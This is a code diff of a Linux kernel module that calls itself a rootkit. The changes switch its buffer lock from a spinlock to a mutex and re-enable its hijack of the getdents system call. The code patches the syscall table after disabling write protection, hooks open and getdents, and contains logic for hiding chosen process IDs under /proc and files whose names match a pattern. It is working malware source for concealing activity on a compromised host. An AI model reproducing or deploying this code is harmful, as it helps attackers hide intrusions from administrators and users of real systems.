@@ -41,7 +41,7 @@ struct hidden_pids_struct {
 
 struct buffer_struct {
     void *buf;
-    spinlock_t lock;
+    struct mutex lock;
 };
 
 struct buffer_struct buf_struct;
@@ -213,14 +213,14 @@ int is_proc(const char __user *ustr)
     int ret = 0;
     char *kpathname;
 
-    spin_lock(&(buf_struct.lock));
+    mutex_lock(&(buf_struct.lock));
     kpathname = get_str_in_kernelspace(ustr, buf_struct.buf, PATH_MAX);
     if (kpathname == NULL)
         goto out;
     if (strcmp("/proc", kpathname) == 0)
         ret = 1;
 out:
-    spin_unlock(&(buf_struct.lock));
+    mutex_unlock(&(buf_struct.lock));
     return ret;
 }
 
@@ -254,6 +254,17 @@ int filename_matches_pattern(const char *filename)
 
 asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
+    int ret;
+
+    //mutex_lock(&(buf_struct.lock));
+    ret = original_getdents(fd, dirp, count);
+    //mutex_unlock(&(buf_struct.lock));
+
+    return ret;
+}
+/*
+asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
     mm_segment_t old_fs;
     struct linux_dirent *dir;
     int ret;
@@ -266,7 +277,7 @@ asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned 
     ubuf = dirp;
 
 
-    spin_lock(&(buf_struct.lock));
+    mutex_lock(&(buf_struct.lock));
 
     old_fs = get_fs();
     ret = original_getdents(fd, (struct linux_dirent *) kbuf, BUFSIZE);
@@ -279,19 +290,19 @@ asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned 
         dir = (struct linux_dirent *) (kbuf + kbuf_offset);
 
         if (proc_open_fd == fd && proc_open_pid == current->pid) {
-            /* this means we are calling getdents on "/proc"
-               we have to hide the pids in our list */
+            // this means we are calling getdents on "/proc"
+            // we have to hide the pids in our list
             pid = get_pid_from_str(dir->name);
             if (pid > 0 && is_in_hidden_pids(pid))
                 continue;
         }
         
-        /* also check for special prefixes or suffixes
-           and hide those files that match pattern  */ 
+        // also check for special prefixes or suffixes
+        // and hide those files that match pattern 
         if (hide_files_flag && filename_matches_pattern(dir->name))
                 continue;
 
-        /* normal copy if nothing to hide */
+        // normal copy if nothing to hide
         copy_to_user(ubuf + ubuf_offset, kbuf + kbuf_offset, dir->d_reclen);
         ubuf_offset += dir->d_reclen;
     }
@@ -299,9 +310,11 @@ asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned 
     ret = ubuf_offset;
 
 out:
-    spin_unlock(&(buf_struct.lock));
+    mutex_unlock(&(buf_struct.lock));
     return ret;
 }
+*/
+
 
 asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 {
@@ -378,7 +391,7 @@ pointer_size_t **find_syscall_table(void)
 
 void init_buf_struct(void)
 {
-    spin_lock_init(&(buf_struct.lock)); 
+    mutex_init(&(buf_struct.lock)); 
     buf_struct.buf = kmalloc(BUFSIZE, GFP_KERNEL);
 }
 void deinit_buf_struct(void)
@@ -424,12 +437,12 @@ int rootkit_init(void)
     // hijack open system call
     original_open = (asmlinkage long (*)(const char *, int, mode_t)) syscall_table[__NR_open];
     syscall_table[__NR_open] = (void *) my_open;
-    /*
+    
     // hijack getdents system call
     original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
                         syscall_table[__NR_getdents];
     syscall_table[__NR_getdents] = (void *) my_getdents;
-    */
+    
     // enable write protected
     write_cr0(read_cr0() & 0x10000);
     
@@ -453,7 +466,7 @@ void rootkit_exit(void)
     syscall_table[__NR_close] = (void *) original_close;
     syscall_table[__NR_open] = (void *) original_open;
 
-    //syscall_table[__NR_getdents] = (void *) original_getdents;
+    syscall_table[__NR_getdents] = (void *) original_getdents;
     
     // Enable write protection on page
     write_cr0(read_cr0() & 0x10000);
